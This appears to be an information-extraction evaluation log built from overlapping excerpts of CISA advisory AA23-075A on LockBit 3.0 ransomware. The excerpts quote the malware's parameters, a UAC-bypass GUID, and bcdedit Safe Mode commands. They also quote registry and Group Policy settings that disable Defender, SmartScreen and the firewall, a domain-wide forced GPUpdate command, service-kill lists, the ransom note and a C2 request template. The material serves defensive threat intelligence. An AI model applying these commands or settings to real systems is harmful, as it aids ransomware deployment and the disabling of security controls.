PuTTY Link (Plink)
Can be used to automate Secure Shell (SSH) actions on Windows.
T1572
Rclone
Command-line program to manage cloud storage files
S1040
SoftPerfect Network Scanner
Performs network scans.
T1046
Splashtop
Remote-desktop software.
T1021.001
WinSCP
SSH File Transfer Protocol client for Windows.
T1048
Indicators of Compromise (IOCs)
The IOCs and malware characteristics outlined below were derived from field analysis. The following samples are current as of March 2023.
LockBit 3.0 Black Icon
LockBit 3.0 Wallpaper
LockBit Command Line Parameters
LockBit Parameters
Description
-del
Self-delete.
-gdel
Remove LockBit 3.0 group policy changes.
-gspd
Spread laterally via group policy.
-pass (32 character value)
(Required) Password used to launch LockBit 3.0.
-path (File or path)
Only encrypts provided file or folder.
-psex
Spread laterally via admin shares.
-safe
Reboot host into Safe Mode.
-wall
Sets LockBit 3.0 Wallpaper and prints out LockBit 3.0 ransom note.
Mutual Exclusion Object (Mutex) Created
When executed, LockBit 3.0 will create the mutex, Global\<MD4 hash of machine GUID>,
and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.
UAC Bypass via Elevated COM Interface



## AA23-075A:evaluation:llama500:9606:11457

Status: candidates_ready_for_review
Case time: 3.90 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 (Mutex) Created
When executed, LockBit 3.0 will create the mutex, Global\<MD4 hash of machine GUID>,
and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.
UAC Bypass via Elevated COM Interface
LockBit 3.0 is capable of bypassing User Account Control (UAC) to execute code with elevated privileges via elevated Component Object Model (COM) Interface. C:\Windows\System32\dllhost.exe is spawned with high integrity with the command line GUID 3E5FC7F9-9A51-4367-9063-A120244FBEC.
For example, %SYSTEM32%\dllhost.exe/Processid:{3E5FC7F9-9A51-4367-9063- A120244FBEC7}.
Volume Shadow Copy Deletion
LockBit 3.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow Copies. LockBit 3.0 uses select * from Win32_ShadowCopy to query for Volume Shadow copies, Win32_ShadowCopy.ID to obtain the ID of the shadow copy, and DeleteInstance to delete any shadow copies.
Registry Artifacts
LockBit 3.0 Icon
Registry Key
Value
Data
HKCR\. <Malware Extension>
(Default)
<Malware Extension>
HKCR\<Malware Extension>\DefaultIcon
(Default)
C:\ProgramData\<Mal ware Extension>.ico
LockBit 3.0 Wallpaper
Registry Key
Value
Data
HKCU\Control Panel\Desktop\WallPaper
(Default)
C:\ProgramData\<Mal ware Extension>.bmp
Disable Privacy Settings Experience
Registry Key
Value
Data
SOFTWARE\Policies\Microsoft\Win dows\OOBE
DisablePrivacyE xperience
0
Enable Automatic Logon
Registry Key
Value
Data
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
AutoAdminLogon
1
DefaultUserName
<username>
DefaultDomainNa me
<domain name>
DefaultPassword
<password>
Disable and Clear Windows Event Logs
Registry Key
Value
Data
HKLM\SOFTWARE\Microsoft\Windows \CurrentVersion\WINEVT\Channels \*
Enabled
0
HKLM\SOFTWARE\Microsoft\Windows \CurrentVersion\WINEVT\Channels \* \ChannelAccess
ChannelAccess


- LockBit 3.0 Affiliates -> USES -> LockBit 3.0
  Literal support: When executed, LockBit 3.0 will create the mutex, Global\<MD4 hash of machine GUID>,

## AA23-075A:evaluation:llama500:11240:12930

Status: empty_extraction
Case time: 0.39 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 Windows Event Logs
Registry Key
Value
Data
HKLM\SOFTWARE\Microsoft\Windows \CurrentVersion\WINEVT\Channels \*
Enabled
0
HKLM\SOFTWARE\Microsoft\Windows \CurrentVersion\WINEVT\Channels \* \ChannelAccess
ChannelAccess
AO:BAG:SYD:(A;;0x1;; ;SY)(A;;0x5;;;BA)(A; ;0x1;;;LA)
Ransom Locations
LockBit 3.0 File Path Locations
ADMIN$\Temp\<LockBit3.0 Filename>.exe
%SystemRoot%\Temp\<LockBit3.0 Filename>.exe
\<Domain Name>\sysvol\<Domain Name>\scripts\<Lockbit 3.0 Filename>.exe (Domain Controller)
Safe Mode Launch Commands
LockBit 3.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon the host operating system, the following command is launched to reboot the system to Safe Mode with Networking:
Operating System
Safe Mode with Networking command
Vista and newer
bcdedit /set {current} safeboot network
Pre-Vista
bootcfg /raw /a /safeboot:network /id 1
Operating System
Disable Safe mode reboot
Vista and newer
bcdedit /deletevalue {current} safeboot
Pre-Vista
bootcfg /raw /fastdetect /id 1
Group Policy Artifacts
The following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3.0 infection:
NetworkShares.xml
<?xml version="1.0" encoding="utf-8"?>
<NetworkShareSettings clsid="{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}">
<NetShare clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
image="2" name="%%ComputerName%%_D" changed="%s" uid="%s">
<Properties action="U" name="%%ComputerName%%_D" path="D:" comment="" allRegular="0" allHidden="0" allAdminDrive="0" limitUsers="NO_CHANGE" abe="NO_CHANGE"/>
Services.xml stops and disables services on the Active Directory (AD) hosts.
Services.xml
<?xml version="1.0" encoding="utf-8"?>



## AA23-075A:evaluation:llama500:12712:14097

Status: empty_extraction
Case time: 0.32 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 allRegular="0" allHidden="0" allAdminDrive="0" limitUsers="NO_CHANGE" abe="NO_CHANGE"/>
Services.xml stops and disables services on the Active Directory (AD) hosts.
Services.xml
<?xml version="1.0" encoding="utf-8"?>
<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}">
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQLPBDMS" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLPBDMS" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQLPBENGINE" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLPBENGINE" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="MSSQLFDLauncher" image="4" changed="%s" uid="%s" userContext="0" removePolicy="0" disabled="0">
<Properties startupType="DISABLED" serviceName="MSSQLFDLauncher" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQLSERVERAGENT" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLSERVERAGENT" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="MSSQLServerOLAPService" image="4" changed="%s" uid="%s" disabled="0">



## AA23-075A:evaluation:llama500:13954:15486

Status: empty_extraction
Case time: 0.28 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

Service>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="MSSQLServerOLAPService" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="MSSQLServerOLAPService" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SSASTELEMETRY" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SSASTELEMETRY" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQLBrowser" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLBrowser" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQL Server Distributed Replay Client" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQL Server Distributed Replay Client" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQL Server Distributed Replay Controller" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQL Server Distributed Replay Controller" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="MsDtsServer150" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="MsDtsServer150" serviceAction="STOP" timeout="30"/>



## AA23-075A:evaluation:llama500:15300:16716

Status: empty_extraction
Case time: 0.33 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

F9-005FBFBA1A43}"
name="MsDtsServer150" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="MsDtsServer150" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SSISTELEMETRY150" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SSISTELEMETRY150" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SSISScaleOutMaster150" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SSISScaleOutMaster150" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SSISScaleOutWorker150" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SSISScaleOutWorker150" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="MSSQLLaunchpad" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="MSSQLLaunchpad" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQLWriter" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLWriter" serviceAction="STOP" timeout="30"/>
</NTService>



## AA23-075A:evaluation:llama500:16524:18208

Status: empty_extraction
Case time: 0.30 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

-92F9-005FBFBA1A43}"
name="SQLWriter" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLWriter" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="SQLTELEMETRY" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="SQLTELEMETRY" serviceAction="STOP" timeout="30"/>
</NTService>
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
name="MSSQLSERVER" image="4" changed="%s" uid="%s" disabled="0">
<Properties startupType="DISABLED" serviceName="MSSQLSERVER" serviceAction="STOP" timeout="60"/>
</NTService>
</NTServices>
Registry.pol
The following registry configuration changes values for the Group Policy refresh time, disable SmartScreen, and disable Windows Defender.
Registry Key
Registry Value
Value type
Data
HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh TimeDC
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh TimeOffsetDC
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh Time
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh TimeOffset
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s\System
EnableSmartScreen
REG_D WORD
0
HKLM\SOFTWARE\Policies\Microsoft\Window s\System
**del.ShellSmartSc reenLevel
REG_S Z
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender
DisableAntiSpyware
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender
DisableRoutinelyTa kingAction
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Real-Time Protection
DisableRealtimeMon itoring
REG_D WORD
1



## AA23-075A:evaluation:llama500:17999:19572

Status: empty_extraction
Case time: 0.41 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:


1
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender
DisableRoutinelyTa kingAction
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Real-Time Protection
DisableRealtimeMon itoring
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Real-Time Protection
DisableBehaviorMon itoring
REG_D WORD
1
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Spynet
SubmitSamplesConse nt
REG_D WORD
2
HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Spynet
SpynetReporting
REG_D WORD
0
HKLM\SOFTWARE\Policies\Microsoft\Window sFirewall\DomainProfile
EnableFirewall
REG_D WORD
0
HKLM\SOFTWARE\Policies\Microsoft\Window sFirewall\StandardProfile
EnableFirewall
REG_D WORD
0
Force GPUpdate
Once new group policies are added, a PowerShell command using Group Policy update (GPUpdate) applies the new group policy changes to all computers on the AD domain.
Force GPUpdate Powershell Command
powershell Get-ADComputer -filter * -Searchbase '%s' | Foreach-Object { Invoke- GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}
Services Killed
vss
sql
svc$
memtas
mepocs
msexchange
sophos
veeam
backup
GxVss
GxBlr
GxFWD
GxCVD
GxCIMgr
Processes Killed
sql
oracle
ocssd
dbsnmp
synctime
agntsvc
isqlplussvc
xfssvccon
mydesktopservice
ocautoupds
encsvc
firefox
tbirdconfig
mydesktopqos
ocomm
dbeng50
sqbcoreservice
excel
infopath
msaccess
mspu
onenote
outlook
powerpnt
steam
thebat
thunderbird
visio
winword
wordpad
notepad
LockBit 3.0 Ransom Note
~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~
>>>>> Your data is stolen and encrypted.



## AA23-075A:evaluation:llama500:19385:20727

Status: empty_extraction
Case time: 0.36 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

bat
thunderbird
visio
winword
wordpad
notepad
LockBit 3.0 Ransom Note
~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~
>>>>> Your data is stolen and encrypted.
If you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.
Network Connections
If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.
Example of HTTP POST request
POST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br Content-Type: text/plain
User-Agent: Safari/537.36 <Lockbit User Agent String>
Host: <Lockbit C2>
Connection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit
ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl



## AA23-075A:evaluation:llama500:20640:22313

Status: empty_extraction
Case time: 0.52 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

PR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl
Example of information found in encrypted data
{
"bot_version":"X",
"bot_id":"X",
"bot_company":"X", "host_hostname":"X", "host_user":"X",
"host_os":"X",
"host_domain":"X",
"host_arch":"X",
"host_lang":"X", "disks_info":[
{
"disk_name":"X",
"disk_size":"XXXX", "free_size":"XXXXX"
}
User Agent Strings
Mozilla/5.0 (Windows NT
6.1)
AppleWebKit/587.38
(KHTML, like Gecko)
Chrome/91.0.4472.77
Safari/537.36
Edge/91.0.864.37
Firefox/89.0
Gecko/20100101
MITRE ATT&CK TECHNIQUES
See Table 3 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s Decider Tool and Best Practices for MITRE ATT&CK Mapping Guide.
Initial Access
Technique Title
ID
Use
Valid Accounts
T1078
LockBit 3.0 actors obtain and abuse credentials of existing accounts as a means of gaining initial access.
Exploit External Remote Services
T1133
LockBit 3.0 actors exploit RDP to gain access to victim networks.
Drive-by Compromise
T1189
LockBit 3.0 actors gain access to a system through a user visiting a website over the normal course of browsing.
Exploit Public-Facing Application
T1190
LockBit 3.0 actors exploit vulnerabilities in internet-facing systems to gain access to victims’ systems.
Phishing
T1566
LockBit 3.0 actors use phishing and spearphishing to gain access to victims' networks.
Execution
Technique Title
ID
Use
Execution
TA0002
LockBit 3.0 launches commands during its execution.
Software Deployment Tools
T1072
LockBit 3.0 uses Chocolatey, a command- line package manager for Windows.
Persistence
Technique Title



## AA23-075A:evaluation:llama500:22086:24117

Status: empty_extraction
Case time: 0.57 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:


Technique Title
ID
Use
Execution
TA0002
LockBit 3.0 launches commands during its execution.
Software Deployment Tools
T1072
LockBit 3.0 uses Chocolatey, a command- line package manager for Windows.
Persistence
Technique Title
ID
Use
Valid Accounts
T1078
LockBit 3.0 uses a compromised user account to maintain persistence on the target network.
Boot or Logo Autostart Execution
T1547
LockBit 3.0 enables automatic logon for persistence.
Privilege Escalation
Technique Title
ID
Use
Privilege Escalation
TA0004
Lockbit 3.0 will attempt to escalate to the required privileges if current account privileges are insufficient.
Boot or Logo Autostart Execution
T1547
LockBit 3.0 enables automatic logon for privilege escalation.
Defense Evasion
Technique Title
ID
Use
Obfuscated Files or Information
T1027
LockBit 3.0 will send encrypted host and bot information to its C2 servers.
Indicator Removal: File Deletion
T1070.004
LockBit 3.0 will delete itself from the disk.
Execution Guardrails: Environmental Keying
T1480.001
LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered.
Credential Access
Technique Title
ID
Use
OS Credential Dumping: LSASS Memory
T1003.001
LockBit 3.0 uses Microsoft Sysinternals ProDump to dump the contents of LSASS.exe.
Discovery
Technique Title
ID
Use
Network Service Discovery
T1046
LockBit 3.0 uses SoftPerfect Network Scanner to scan target networks.
System Information Discovery
T1082
LockBit 3.0 will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.
System Location Discovery: System Language Discovery
T1614.001
LockBit 3.0 will not infect machines with language settings that match a defined exclusion list.
Lateral Movement
Technique Title
ID
Use
Remote Services: Remote Desktop Protocol
T1021.001
LockBit 3.0 uses Splashtop remote- desktop software to facilitate lateral movement.
Command and Control



## AA23-075A:evaluation:llama500:23852:25424

Status: empty_extraction
Case time: 0.54 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 machines with language settings that match a defined exclusion list.
Lateral Movement
Technique Title
ID
Use
Remote Services: Remote Desktop Protocol
T1021.001
LockBit 3.0 uses Splashtop remote- desktop software to facilitate lateral movement.
Command and Control
Technique Title
ID
Use
Application Layer Protocol: File Transfer Protocols
T1071.002
LockBit 3.0 uses FileZilla for C2.
Protocol Tunnel
T1572
LockBit 3.0 uses Plink to automate SSH actions on Windows.
Exfiltration
Technique Title
ID
Use
Exfiltration
TA0010
LockBit 3.0 uses Stealbit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.
Exfiltration Over Web Service
T1567
LockBit 3.0 uses publicly available file sharing services to exfiltrate a target’s data.
Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
LockBit 3.0 actors use (1) rclone, an open source command line cloud storage manager to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.
Impact
Technique Title
ID
Use
Data Destruction
T1485
LockBit 3.0 deletes log files and empties the recycle bin.
Data Encrypted for Impact
T1486
LockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources.
Service Stop
T1489
LockBit 3.0 terminates processes and services.
Inhibit System Recovery
T1490
LockBit 3.0 deletes volume shadow copies residing on disk.
Defacement: Internal Defacement
T1491.001
LockBit 3.0 changes the host system’s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively.



